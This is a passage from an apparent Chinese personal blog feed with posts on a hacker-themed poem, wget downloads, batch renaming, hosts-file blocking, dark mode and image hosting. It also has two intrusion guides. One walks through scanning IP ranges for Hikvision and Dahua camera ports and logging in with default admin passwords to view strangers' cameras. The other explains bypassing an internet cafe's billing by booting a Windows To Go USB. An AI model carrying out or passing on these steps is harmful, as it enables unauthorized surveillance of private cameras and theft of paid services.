        <content type="html"><![CDATA[<p>Hacker技术学的再好, 却无法侵入你的心,</p><p>服务器入侵的再多,对你只有Guest,</p><p>是我的DDOS造成了你的拒绝服务？</p><p>还是我的Byshell再次被你查杀？</p><p>你总有防火墙</p><p>我始终停不掉</p><p>想提权</p><p>无奈JSP+MYSQL成为我们的障碍</p><p>找不到你的注入点</p><p>扫不出你的空口令</p><p>所有对我的回应都用3DES加密</p><p>你总是自定义文件格式</p><p>我永远找不到你的入口点</p><p>忽略所有异常</p><p>却还是跟踪不到你的注册码</p><p>是你太过完美,还是我太菜?</p><p>虽然我们是不同的对象,都有隐私的一面,</p><p>但我相信总有一天我会找到你的接口,把我的最真给你看!</p><p>因为我是你的指针,在茫茫内存的堆栈中, 永远指向你那片天空,不孜不倦!</p><p>我愿做你的内联,供你无限次的调用,直到海枯石烂!</p><p>我愿做你的引用,和你同进退共生死,一起经受考验!</p><p>只是我不愿苦苦地调试你的心情,最终沦为你的友元!</p><p>如今我们已被MFC封装–事事变迁!</p><p>如今我们已向COM走去–可想当年!</p><p>没任何奢求,只愿做你最后的Administrator!</p><p>渗透玩的再强,我也不能提权进你的心</p><p>免杀玩的再狠,我也过不了你的主防御</p><p>外挂写的再叼,我也不能操控你对我的爱</p><p>编程玩的再好,我也不能写出完美的爱情</p><p>纵使我多么的不可一世,也不是你的admin</p><p>提权了再多的服务器，却永远成不了你的Root</p><p><strong>But……</strong></p><p>那怕你的心再强大，我有0day在手</p><p>主动防御再牛，我有Ddos</p><p>击败你只是时间问题, 就算能操控，你的心早已经不属于我</p><p>已被千人DownLoad</p><p>完美的爱情写出来能怎样，终究会像游戏一样结束</p><p>不是你的admin也罢，但我有用户，早晚提权进入你的用户组</p><p>转载于互联网！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优雅的入侵网络摄像头</title>
      <link href="/posts/56992.html"/>
      <url>/posts/56992.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>弱密码摄像头批量入侵，端口37777,8000，默认密码账号admin</p></blockquote><p>这个一个非常简单易懂，没有什么太多技术含量的，默认弱密码摄像头入侵。</p><ul><li>首先，使用Scanport 批量扫描你所选IP的此类型号摄像头的端口，37777,8000，也可以指定IP或者扫自己周围IP的，这样比较快，如果说范围太大可能会很慢。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108111554.png" alt=""></p><ul><li>(海康的服务控制端口是8000，大华的是37777，经过测试确实这两款还是存在不少弱密码没有修改，虽然很多地方都爆料过，但是现在大部分地区对于网络安全还是缺乏安全意识。)</li><li>第二步，打开工具PSS4.6参数生成器，把全部已经搜索到的IP，直接复制到PSS4.6参数生成器当中，配置好PSS的路径和密码，点击输出即可。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108111555.png" alt=""></p><p>接下来就可以登录PSS，发现输出的密码已经填好，直接登录即可。</p><p>然后点登录，就进去了，但是，现在发现有很多都是查看不了的，可能是很多原因因素导致的，还需要自己更深入的去了解，想办法去解决，如果只是随便看看，当中肯定是有一两个是可以查看的。  </p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108111556.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows——优雅地实现批量下载</title>
      <link href="/posts/undefined.html"/>
      <url>/posts/undefined.html</url>
      
        <content type="html"><![CDATA[<h3 id="下载-艺术"><a href="#下载-艺术" class="headerlink" title="下载=艺术"></a>下载=艺术</h3><p>今天，嗯，emm，朋友找我下载一些付费的课程，<br><em>她说：“她的一些网课视频只能在手机上下载，并且只能用QQ浏览器下载。”</em><br><em>我当时一听，这么流氓的吗？？？</em></p><p>当时我便打开啦我的电脑，<br>通过分析网页数据，找到了这个“网络资源”的URL。<br>之后我爬取所有的URL；<br>找到了三种方法批量下载：<br>1、使用TELEPROTULTRA进行多线程批量下载。（这个方法太占用内存）<br>2、使用迅雷的批量下载（这里好像会限速，所以我并没有采用这个方法）<br><em>提到批量下载，更多的人第一个想到的是迅雷——可惜纵然推出了轻量版，迅雷仍然属于不可忍受的广告类软件之一。</em><br>3.利用网络爬虫爬取也是可以的（这个门槛比较高，我就不分享我那不堪入目的代码啦）<br><strong>接下来是今天的主角，他的优点轻快、效率高</strong></p><blockquote><p>WGET</p><p>这<br>wget 是一个从网络上自动下载文件的自由工具，支持通过 HTTP、HTTPS、FTP 三个最常见的 TCP/IP协议 下载，并可以使用 HTTP 代理。”wget” 这个名称来源于 “World Wide Web” 与 “get” 的结合。<br>所谓自动下载，是指 wget 可以在用户退出系统的之后在继续后台执行，直到下载任务完成。</p></blockquote><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>再开始下载之前我们得配置WGET.EXE程序（Linux系统也有对应的软件）<br><em>这个配置方法我个人感觉是比较通俗易懂的</em><br>我把事先准备好的WGET.EXE程序，<br>移动到C:WindowsSystem32文件夹下</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108105340.png" alt=""></p><p>移动完成之后，我们ctrl r cmd来到dos命令窗口，输入wget；<br>显示以下结果，说明WGET.EXE程序完美安装</p><pre><code> WGET: missing URL   Usage: WGET [OPTION]... [URL]...  Try `WGET --help' for more options.</code></pre><h4 id="如何优雅的批量下载HTTP协议头的网络资源"><a href="#如何优雅的批量下载HTTP协议头的网络资源" class="headerlink" title="如何优雅的批量下载HTTP协议头的网络资源"></a>如何优雅的批量下载HTTP协议头的网络资源</h4><p>新建一个文件夹，我们把整理好的url.txt文本<br>放在新建的这个文件夹里，之后在地址栏输入cmd按Enter<br>进入dos窗口，注意我们新建的这个文件夹就是“网络资源”缓存的路径，<br><em>当然可以在dos界面直接进入文件夹并指定缓存路径。</em></p><p>我们在dos命令窗口输入命令执行下载<br>命令格式：</p><pre><code>wget -i xxx.txtwget http://xxx.xxx.com</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108105339.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108105338.png" alt=""></p><blockquote><h4 id="WGET下载"><a href="#WGET下载" class="headerlink" title="WGET下载"></a>WGET下载</h4></blockquote><h5 id="蓝奏云直通车"><a href="#蓝奏云直通车" class="headerlink" title="蓝奏云直通车"></a><a href="https://www.lanzous.com/i5s0hyj" target="_blank" rel="noopener">蓝奏云直通车</a></h5><p>此方法适用于HTTP协议头传输的资源</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巧用bat批处理对文件后缀名进行批量修改</title>
      <link href="/posts/4400.html"/>
      <url>/posts/4400.html</url>
      
        <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>今天呢，帮大哥diy爬取了一些类似于室内家具效果图的图片素材<br><del>偏锋小菜鸡</del>一会功夫爬取了近千张的素材，美滋滋的打开文件夹  </p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108102915.png" alt=""></p><p>结果一看，！！！？？？？是这样子的；如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108103033.png" alt=""></p><p>发现图片后缀名全是错误的，例如这样<strong>-JPEG</strong></p><p>哇，这个总不能我一张一张的改吧？？？<br>我此时此刻的心情是这样的<em>&amp;……&amp;&amp;*</em>&amp;……%&amp;&amp;&amp;……%&amp;……</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108103031.png" alt=""></p><p><em>偏锋小菜鸡</em>，灵机一闪想到了批量重命名文件名；想必理论上命名后缀也可以的。</p><h4 id="进入实战"><a href="#进入实战" class="headerlink" title="进入实战"></a>进入实战</h4><p>果不其然，可以做一个批处理命令，一键修改文件名后缀。</p><pre><code>@echo offecho --------------------------------------------------偏锋专用批量修改脚本---------------------------- ----------------------echo ------------------------------------------------------------------------------------------------- -------------------------color apauseecho 【您即将进行批量修改后缀名操作.....】pauseecho 【！！！包括此文件后缀也会被更改！！！】pauseren * *.jpgpauseecho 按任意键退出pause</code></pre><p><strong>代码注释：</strong></p><pre><code>echo xxx                         ::输出提示信息@echo off/no                     ::打开回显或关闭回显功能/如果想关闭“ECHO OFF”命令行自身的显示，则需要在该                                    命令行前加上“@”pause                            ::暂停color                            ::字体颜色ren * *.jpg                      ::ren重命名命令； “ * ”代表文件参数（通俗来说就是需要修改的文件名字）当然                                    文件名统一的话也可以修改，例如ren                       img.png *.jpg (记得一个参数一个空格)</code></pre><p><strong>脚本打开效果</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108103032.png" alt=""></p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>创建一个txt文本，将以上代码复制到文本中，保存修改文本后缀.txt为.bat（如图所示）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108103034.png" alt=""></p><p>双击打开脚本，按照提示操作，，最后我们可以看到文件后缀全部修改为.jpg了；如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200108103035.png" alt=""></p><p>至此，总算搞定了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10开启暗黑模式小技巧</title>
      <link href="/posts/35247.html"/>
      <url>/posts/35247.html</url>
      
        <content type="html"><![CDATA[<h4 id="暗黑模式在哪里？"><a href="#暗黑模式在哪里？" class="headerlink" title="暗黑模式在哪里？"></a>暗黑模式在哪里？</h4><p>回到桌面<strong>右键单击桌面</strong>，弹出的菜单窗口中选择<strong>个性化</strong></p><p>找到<strong>颜色</strong>选项，选择颜色<strong>暗黑</strong></p><p><strong>Windows模式</strong>-深色-应用模式<strong>暗</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/Windowsahms.png" alt=""></p><p>通往计算机的道路不止一条，2020 冲冲冲！！！！</p><p>趁年轻 多折腾 才成功。努力就会有结果，机会留给有准备的人！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hosts禁止访问某个网站，或者禁网限速</title>
      <link href="/posts/60634.html"/>
      <url>/posts/60634.html</url>
      
        <content type="html"><![CDATA[<p>很多人的家里都有小朋友，因为他们普遍都喜欢玩4399小游戏、7k7k小游戏、之类的页游。<br>我们可以通过禁止访问某一个网页这样的一些措施，来限制小朋友打开网页。（方法也有很多）</p><p><strong>首先呢先来介绍一下hosts这个文件是用来干嘛的。</strong></p><blockquote><p>hosts</p><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。<br>需要注意的是，Hosts文件配置的映射是静态的，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问。</p></blockquote><blockquote><p>Hosts工作原理</p><p>浏览器访问网站，要首先通过DNS服务器把要访问的网站域名解析成其指定的IP地址，之后，浏览器才能对此网站进行定位并且访问其数据。<br>操作系统规定，在进行DNS请求以前，先检查系自己的Hosts文件中是否有这个域名和IP的映射关系。如果有，则直接访问这个IP地址指定的网络位置，如果没有，再向已知的DNS服务器提出域名解析请求。也就是说Hosts的IP解析优先级比DNS要高。</p></blockquote><p><strong>个别浏览器会显示网站重定向，以此来达到本地禁止访问网页</strong></p><blockquote><p>存储位置</p><p>hosts文件在不同操作系统（甚至不同Windows版本）的位置都不大一样，<br>以下为hosts文件在不同系统中所处的目录<br>Windows XP/2000/Vista/7/8/8.1/10:C:windowssystem32driversetc\<br>（XP系统无法使用bat批处理命令直接替换hosts，需手动替换后重新插拔网线或重启方使hosts生效）<br>（可更改HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTcpipParametersDataBasePath项修改host位置）<br>Windows 95/98/Me：%WinDir% （其实就是C:WINDOWS）<br>Linux及其他类Unix操作系统：/etc/<br>Mac OS 9及更早的系统：System Folder: Preferences或System folder（文件格式可能与Windows和Linux所对应的文件不同）<br>Mac OS X：/private/etc（使用BSD风格的hosts文件）<br>OS/2及eComStation：”bootdrive”:mptnetc\<br>Android：/system/etc/<br>Symbian第1/2版手机：C:systemdata\<br>Symbian第3版手机：C:private10000882（能使用兼容AllFiles的文件浏览器访问。）<br>iPhone OS：/etc/(需要越狱)<br>iPad OS：/private/etc<br>webOS:/etc</p></blockquote><h2 id="我的Hosts文件内容如下："><a href="#我的Hosts文件内容如下：" class="headerlink" title="我的Hosts文件内容如下："></a>我的Hosts文件内容如下：</h2><pre><code># Copyright (c) 1993-2009 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name.# The IP address and the host name should be separated by at least one# space.## Additionally, comments (such as these) may be inserted on individual# lines or following the machine name denoted by a '#' symbol.## For example:##      102.54.94.97     rhino.acme.com          # source server#       38.25.63.10     x.acme.com              # x client host# localhost name resolution is handled within DNS itself.#    127.0.0.1        localhost#    ::1              localhost</code></pre><blockquote><p>如果怀疑你的Hosts文件被篡改或删除，可以采用以上代码，进行恢复。</p><p>另外#号后都是注释，所以清空hosts文件对系统正常运行并没有什么影响。</p><p>建议大家保留Hosts文件</p></blockquote><h4 id="具体作用"><a href="#具体作用" class="headerlink" title="具体作用"></a>具体作用</h4><p>1、加快域名解析<br>2、方便局域网用户<br>3、顺利连接系统<br>4.虚拟域名<br>最后呢就是今天禁止/屏蔽网站（5、屏蔽网站（域名重定向））</p><h4 id="屏蔽网站联网的手法"><a href="#屏蔽网站联网的手法" class="headerlink" title="屏蔽网站联网的手法"></a>屏蔽网站联网的手法</h4><p>有很多网站不经过用户同意就将各种各样的插件安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的域名映射到错误的IP或本地计算机的IP，这样就不用访问了。在WINDOWS系统中，约定 127.0.0.1 为本地计算机的IP地址, 0.0.0.0是错误的IP地址。<br>如果，我们在Hosts中，写入以下内容：<br>127.0.0.1要屏蔽的网站A的域名<br>0.0.0.0要屏蔽的网站B的域名</p><h4 id="文件存放路径：C-WindowsSystem32driversetc"><a href="#文件存放路径：C-WindowsSystem32driversetc" class="headerlink" title="文件存放路径：C:WindowsSystem32driversetc"></a>文件存放路径：C:WindowsSystem32driversetc</h4><p>这样，计算机解析域名A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。</p><blockquote><p><strong>Hosts填写格式ip地址+空格+网址</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/host1.png" alt=""></p><p><strong>lnternet安全设置。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/host2.png" alt=""></p><p>ps：在没有生效的情况下使用。</p><p><em>最后Ctrl+R调出管理员命令窗口<br>输入：<br>ipconfig /flushdns<br>回车<br>成功刷新DNS缓存</em>如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/host3.png" alt=""></p><h4 id="还有一种方法就是利用一些网盾or杀毒软件进行断网或屏蔽。"><a href="#还有一种方法就是利用一些网盾or杀毒软件进行断网或屏蔽。" class="headerlink" title="还有一种方法就是利用一些网盾or杀毒软件进行断网或屏蔽。"></a>还有一种方法就是利用一些网盾or杀毒软件进行断网或屏蔽。</h4><p><strong>我用的是火绒安全软件</strong>这个软件挺强大的：禁网限速等等都有<br>系统防护，联网控制给软件禁用网络达到我们的预期效果（基本上用户软件都能时间禁网）如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/host4.png" alt=""></p><p><em>ps：方法不仅有这些，防火墙设置都可以实现。</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用优雅的姿势绕过网吧收费系统</title>
      <link href="/posts/52056.html"/>
      <url>/posts/52056.html</url>
      
        <content type="html"><![CDATA[<p><strong>软件绕过:</strong>摇钱树网管系统（年龄比我还要大，通过软件漏洞绕过 有些方法理论可以）<br>既然软件绕过 方法比较猥琐。我们可以考虑用硬件绕过。<br><strong>物理绕过：</strong>通过外增一些物理介质达到白嫖目的</p><p>今天就以摇钱树网吧管理系统 为例 进行实战。</p><p>在实战之前呢，先喝口阔乐压压惊。先壮壮胆。<br>好了cat00011cat就不废话啦，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb.jpg" alt=""></p><p>绕过原理：插入U盘通过BIOS驱动自己的U盘。进入自己烧录的Windows TOGO 系统什么是TOGO系统呢？？？顾名思义 可以带着跑的随身系统。</p><p><strong>物理介质绕过</strong><br>材料：<br>一个ShanDisk U盘</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb1.jpg" alt=""></p><p>一个烧录软件：WTGA5010<br>一个ISO镜像文件（建议是使用Win10镜像）<br>会进BIOS</p><p>步骤：<br>1.安装烧录工具Win10系统自带，我这里使用WTGA进行烧录。（安装方法下一步下一步下一步完成）<br>插入U盘；打开软件WTAG之后，选择自己的ISO镜像文件—选择ShanDiakU盘（其它的理论上都不用设置）点击部署即可。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb3.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb4.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb5.png" alt=""></p><p>进入漫长的等待过程（在这个时候建议大家收藏本博客thecat.top 记住偏锋小白菜）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb6.png" alt=""></p><p>等待软件提示写入完成（期间系统会提示格式化U盘）千万不要点击格式化。要不然前功尽弃。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb7.png" alt=""></p><p>进入BIOS界面，选择U盘启动</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb8.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb9.jpg" alt=""></p><p>对Windows进行相关配置即可</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb10.jpg" alt=""></p><p>进入系统之后配置相关驱动即可（完善系统）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/wb11.jpg" alt=""></p><p>至此全部过程就结束了，本教程仅供技术交流切勿用于违法犯罪！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub + jsDelivr + PicGo + Imagine 打造稳定快速、高效免费图床</title>
      <link href="/posts/39161.html"/>
      <url>/posts/39161.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>为什么要使用图床呢？</p></blockquote><p>因为在不同平台发布同一篇文章的时候，最一个痛苦的点就是，图片存储问题，各个平台的文件存储方式各不相同，无法直接 <code>Ctrl + C</code> 的方式一键搞定，为了解决这个问题，使用 <code>MarkDown + 图床</code> 的方式进行文章的写作，将图片放到一个统一的地方，在文章中引入图片外链。<br>所谓图床，就是将图片储存到第三方静态资源库中，其返回给你一个 URL 进行获取图片。<code>MarkDown</code> 支持使用 URL 的方式显示图片，我想这也是程序员为什么对其偏爱的原因之一。<br>作为程序员，你会发现，现在很多论坛和社区都开始支持使用 <code>MarkDown</code>，如果你没使用图床的情况下，你分享同一篇文章，你要在不同的平台，各自重新编辑排版一遍和上传图片一次。<br>有了图床，情况就不一样了，<code>Ctrl+C</code> 的方式就搞定了，根本不用再 Check 文章内容一遍。</p><blockquote><p>图床的选择？</p></blockquote><ol><li><code>微博图床</code>：以前用的人比较多，从 2019 年 4 月开始开启了防盗链，凉凉</li><li><code>SM.MS</code>：运营四年多了，也变得越来越慢了，到了晚上直接打不开图片，速度堪忧</li><li><code>其他小众图床</code>：随时有挂掉的风险</li><li><code>Imgur 等国外图床</code>：国内访问速度太慢，随时有被墙的风险</li><li><code>大厂储存服务</code>：例如七牛云、又拍云、腾讯云COS、阿里云OSS等，操作繁琐，又是实名认证又是域名备案的，麻烦，而且还要花钱（有钱又不怕麻烦的当我没说）</li><li><code>GitHub 图床</code>：免费，但是国内访问速度慢（不过没关系，利用  <code>jsDelivr</code>  提供的免费的 CDN 加速 速度足够了）</li></ol><h3 id="食用流程"><a href="#食用流程" class="headerlink" title="食用流程"></a>食用流程</h3><ol><li>新建 GitHub 仓库</li><li>生成一个 Token</li><li>配置 PicGo 并使用 jsdelivr 作为 CDN 加速</li><li>使用 Imagine 进行图片压缩</li><li>上传图片到 PicGo 并使用图床</li></ol><h3 id="新建-GitHub-仓库"><a href="#新建-GitHub-仓库" class="headerlink" title="新建 GitHub 仓库"></a>新建 GitHub 仓库</h3><ul><li>登录/注册 GitHub</li><li>新建一个仓库，填写好仓库名</li><li>仓库描述</li><li>将权限设置成  <code>public</code></li><li>根据需求选择是否为仓库初始化一个  <code>README.md</code>  描述文件</li></ul><p><strong>新建 GitHub 仓库</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/1.png" alt=""></p><h3 id="生成一个-Token"><a href="#生成一个-Token" class="headerlink" title="生成一个 Token"></a>生成一个 Token</h3><ol><li><p>点击用户头像 -&gt; 选择  <code>Settings</code></p><p><strong>Settings</strong></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/2.png" alt=""></p><ol start="2"><li>点击  <code>Developer settings</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/3.png" alt=""></p><p><strong>Developer settings</strong></p><ol start="3"><li>点击  <code>Personal access tokens</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/4.png" alt=""></p><p><strong>Personal access tokens</strong></p><ol start="4"><li>点击  <code>Generate new token</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/4.png" alt=""></p><p><strong>Generate new token</strong></p><ol start="5"><li>填写  <code>Token</code>  描述，勾选  <code>repo</code>，然后点击  <code>Generate token</code>  生成一个  <code>Token</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/6.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/7.png" alt=""></p><p><strong>填写 Token 描述</strong></p><ol start="6"><li>获取  <code>Token</code>  密钥</li></ol><blockquote><p>注意这个 Token 只会显示一次，自己先保存下来，或者等后面配置好 PicGo 后再关闭此网页</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/8.png" alt=""></p><p><strong>获取 Token 密钥</strong></p><h3 id="配置-PicGo-并使用-jsdelivr-作为-CDN-加速"><a href="#配置-PicGo-并使用-jsdelivr-作为-CDN-加速" class="headerlink" title="配置 PicGo 并使用 jsdelivr 作为 CDN 加速"></a>配置 PicGo 并使用 jsdelivr 作为 CDN 加速</h3><p>前往下载  <a href="https://sitoi.cn/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL01vbHVuZXJmaW5uL3BpY2dvL3JlbGVhc2Vz" target="_blank" rel="noopener">PicGo</a>（<a href="https://sitoi.cn/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL01vbHVuZXJmaW5uL3BpY2dvL3JlbGVhc2Vz" target="_blank" rel="noopener">点击下载</a>），安装好后开始配置图床</p><ul><li><p>设定仓库名：按照  <code>用户名/图床仓库名</code>  的格式填写</p></li><li><p>设定分支名：<code>master</code></p></li><li><p>设定 Token：粘贴之前生成的  